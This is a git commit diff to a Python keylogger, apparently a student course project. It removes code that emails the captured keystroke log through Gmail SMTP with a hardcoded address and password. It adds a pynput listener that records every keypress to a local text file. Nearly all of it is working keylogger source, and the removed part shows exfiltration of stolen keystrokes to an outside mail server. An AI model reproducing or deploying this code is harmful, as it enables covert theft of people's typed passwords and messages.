6f84ed1137d3318f7ed0b219a7e5b6b83f30fb60
Jonathan Lu <jonathanlu2582@gmail.com>
2021-05-05 14:03:40 -0700

    rename and seperate the key input feature

--- KeyLogger Project/trackInput.py
+++ KeyLogger Project/trackInput.py
@@ -7,104 +7,42 @@ key_info = "key_info.txt"
 file_path = "C:\\Users\\bardh\\OneDrive\\Desktop\\keylogger\\KeyLogger Project"     # Change dest file path before test
 extension = "\\"
 
-#email info
-email_address = "cs166keylogger@gmail.com" # Enter disposable email here
-password = "keylog123" # Enter email password here
-username = getpass.getuser()
-toaddr = "cs166keylogger@gmail.com" # Enter the email address you want to send your information to
+count = 0
+keys_list = []
 
-# email controls
-def send_email(filename, attachment, toaddr):
+# Function to keep track whenever a key is press
+def on_press(key):
+    global count
+    global keys_list
 
-    fromaddr = email_address
+    print(key)
+    keys_list.append(key)    # Adds the key to the list
+    count += 1
 
-    msg = MIMEMultipart()
+    # Resets the list and writes to file
+    if count >= 1:
+        count = 0
+        write_file(keys_list)
+        keys_list = []
 
-    msg['From'] = fromaddr
+# Function that writes the keys to file
+def write_file(keys):
+    with open(file_path + extension + key_info, "a") as f:
+        for key in keys_list:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:             # Checks if the input has a space
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
 
-    msg['To'] = toaddr
+# Function to keep track whenever a key is release
+def on_release(key):
+    if key == Key.esc:
+        return False
 
-    msg['Subject'] = "Log File"
+# Listener function that combines all three functions into run
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
-    body = "Body_of_the_mail"
-
-    msg.attach(MIMEText(body, 'plain'))
-
-    filename = filename
-    attachment = open(attachment, 'rb')
-
-    p = MIMEBase('application', 'octet-stream')
-
-    p.set_payload((attachment).read())
-
-    encoders.encode_base64(p)
-
-    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-
-    msg.attach(p)
-
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-
-    s.starttls()
-
-    s.login(fromaddr, password)
-
-    text = msg.as_string()
-
-    s.sendmail(fromaddr, toaddr, text)
-
-    s.quit()
-
-number_of_iterations = 0
-currentTime = time.time()
-stoppingTime = time.time() + time_iteration
-
-number_of_iterations = 0
-currentTime = time.time()
-stoppingTime = time.time() + time_iteration
-
-# Timer for keylogger
-while number_of_iterations < number_of_iterations_end:
-
-    count = 0
-    keys =[]
-
-    def on_press(key):
-        global keys, count, currentTime
-
-        print(key)
-        keys.append(key)
-        count += 1
-        currentTime = time.time()
-
-        if count >= 1:
-            count = 0
-            write_file(keys)
-            keys =[]
-
-    def write_file(keys):
-        with open(file_path + extend + keys_information, "a") as f:
-            for key in keys:
-                k = str(key).replace("'", "")
-                if k.find("space") > 0:
-                    f.write('\n')
-                    f.close()
-                elif k.find("Key") == -1:
-                    f.write(k)
-                    f.close()
-
-    def on_release(key):
-        if key == Key.esc:
-            return False
-        if currentTime > stoppingTime:
-            return False
-
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
-
-    if currentTime > stoppingTime:
-        send_email(keys_information, file_path + extend + keys_information, toaddr)
-        number_of_iterations += 1
-
-        currentTime = time.time()
-        stoppingTime = time.time() + time_iteration
